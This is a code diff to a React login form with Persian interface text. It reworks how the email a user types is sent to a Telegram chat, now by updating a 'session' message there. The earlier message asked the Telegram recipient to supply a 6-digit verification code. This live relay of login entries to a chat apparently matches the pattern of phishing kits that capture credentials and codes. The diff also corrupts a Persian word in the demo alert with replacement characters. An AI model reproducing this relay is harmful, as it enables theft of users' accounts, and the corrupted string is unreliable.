@@ -233,7 +233,7 @@ export const LoginForm = () => {
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo verification code: 123456");
         alert(
-          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
+          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت و��قعی این کد به تلگرام ارسال می‌شود)",
         );
       }
 
@@ -412,23 +412,24 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("📧 Starting email submission:", email);
-
-      // Send email to Telegram and store message ID
-      const result = await sendCustomMessageToTelegram(
-        `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\nلطفا کد ۶ رقمی تایید ایمیل را ارسال کنید.`,
+      console.log(
+        "📧 Updating session with email:",
+        email,
+        "Session ID:",
+        sessionId,
       );
 
-      console.log("📧 Email submission result:", result);
+      // Update the existing session message with email information
+      const result = await updateSessionWithEmail(sessionId, email);
 
-      if (result.success && result.messageId) {
-        setEmailMessageId(result.messageId);
-        console.log("✅ Message ID stored:", result.messageId);
+      console.log("📧 Email update result:", result);
+
+      if (result.success) {
+        console.log("✅ Session updated with email successfully");
+        setEmailStep("code");
       } else {
-        console.log("❌ No message ID received or submission failed");
+        throw new Error("Failed to update session with email");
       }
-
-      setEmailStep("code");
     } catch (error) {
       console.error("Email sending error:", error);
       setErrors({ email: "خطا در ارسال ایمیل. لطفا دوباره تلاش کنید." });
